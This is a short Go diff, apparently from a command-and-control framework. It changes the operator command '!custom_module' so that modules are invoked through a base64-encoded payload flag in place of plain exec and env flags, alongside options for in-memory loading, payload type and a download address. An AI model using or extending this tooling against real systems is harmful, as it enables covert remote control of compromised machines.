@@ -119,17 +119,16 @@ func C2Commands() *cobra.Command {
 	customModuleCmd := &cobra.Command{
 		Use:     def.C2CmdCustomModule,
 		Short:   "Load a custom module",
-		Example: "!custom_module --mod_name <name> --exec <command> --env <env> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>",
+		Example: "!custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>",
 		GroupID: "generic",
 		Run:     runCustomModule,
 	}
 	customModuleCmd.Flags().StringP("mod_name", "m", "", "Module name")
-	customModuleCmd.Flags().StringP("exec", "x", "", "Command to execute")
+	customModuleCmd.Flags().StringP("invocation", "v", "", "Base64-encoded invocation payload")
 	customModuleCmd.Flags().StringP("checksum", "c", "", "Checksum")
 	customModuleCmd.Flags().BoolP("in_mem", "i", false, "Load module in memory")
 	customModuleCmd.Flags().StringP("type", "t", "", "Payload type")
 	customModuleCmd.Flags().StringP("file_to_download", "f", "", "File to download")
-	customModuleCmd.Flags().StringP("env", "e", "", "Environment variables")
 	customModuleCmd.Flags().StringP("download_addr", "d", "", "Download address")
 	rootCmd.AddCommand(customModuleCmd)
 
